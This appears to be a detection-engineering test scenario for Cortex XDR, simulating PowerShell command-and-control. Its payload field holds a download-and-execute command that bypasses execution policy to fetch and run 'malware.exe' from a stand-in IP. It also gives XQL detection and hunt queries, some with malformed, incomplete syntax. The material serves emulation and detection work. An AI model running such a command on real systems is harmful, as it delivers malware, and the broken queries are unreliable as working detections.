identity.name: Windows Endpoint: Abnormal Recurring Communications to Rare Domain
identity.summary: An attacker executes a PowerShell script that repeatedly communicates with a rare domain to establish C2. Cortex detects this behavior via the 'Abnormal Recurring Communications to a Rare Domain' ABIO
identity.description: An attacker executes a PowerShell script that repeatedly communicates with a rare domain to establish C2. Cortex detects this behavior via the 'Abnormal Recurring Communications to a Rare Domain' ABIOC. The attack uses a known malware family's binary to download and execute a payload.

payload.code:
powershell.exe -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\temp\malware.exe');
$process = New-Object System.Diagnostics.ProcessStartInfo; $process.FileName = 'C:\temp\malware.exe'; $process.UseShellExecute = $true; $process.CreateNoWindow = $false; [System.Diagnostics.Process]::Start($process);"

expected_artifacts.description: PowerShell process starts with bypass execution policy

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Process Start with Execution Policy Bypass
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe' and action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains '-ExecutionPolicy Bypass'

abiocs.name: Abnormal Recurring Communications to Rare Domain
abiocs.description: Detects recurring outbound network connections to a rare domain
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.10'
| filter dst_port = 80
| filter action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'DownloadFile'
| comp by action_remote_ip, action_process_image_name, dst_port
| comp count() as cnt by > 1

xql_queries.name: Hunt for PowerShell with Execution Policy Bypass
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_command_line contains '-ExecutionPolicy Bypass'
| comp count() as cnt by action_process_command_line, action_process_image_name
| comp count() as cnt by
